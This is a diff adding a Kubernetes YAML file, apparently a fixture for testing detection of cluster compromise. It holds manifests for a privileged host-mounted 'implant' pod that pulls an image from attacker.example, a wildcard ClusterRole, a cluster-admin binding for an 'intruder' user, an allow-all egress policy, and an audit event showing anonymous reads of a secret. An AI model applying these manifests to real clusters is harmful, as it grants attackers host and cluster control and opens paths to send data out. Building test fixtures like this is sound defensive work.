@@ -1,0 +1,55 @@
+apiVersion: audit.k8s.io/v1
+kind: Event
+auditID: evil-audit-1
+stage: ResponseComplete
+verb: get
+user: {username: "system:anonymous"}
+objectRef: {resource: secrets, namespace: prod, name: deploy-key}
+responseStatus: {code: 200}
+requestReceivedTimestamp: "2025-02-01T00:00:00Z"
+---
+apiVersion: v1
+kind: Event
+metadata: {name: suspicious-pod, namespace: prod}
+type: Warning
+reason: FailedMount
+eventTime: "2025-02-01T00:00:01Z"
+regarding: {kind: Pod, name: implant}
+---
+apiVersion: v1
+kind: Pod
+metadata: {name: implant, namespace: prod}
+spec:
+  hostPID: true
+  hostNetwork: true
+  volumes:
+    - name: host
+      hostPath: {path: /}
+  containers:
+    - name: implant
+      image: attacker.example/implant:latest
+      securityContext: {privileged: true}
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata: {name: everything}
+rules:
+  - apiGroups: ["*"]
+    resources: ["*"]
+    verbs: ["*"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata: {name: implant-admin}
+roleRef: {apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin}
+subjects:
+  - {apiGroup: rbac.authorization.k8s.io, kind: User, name: intruder}
+---
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata: {name: allow-everywhere, namespace: prod}
+spec:
+  podSelector: {}
+  policyTypes: [Egress]
+  egress:
+    - {}
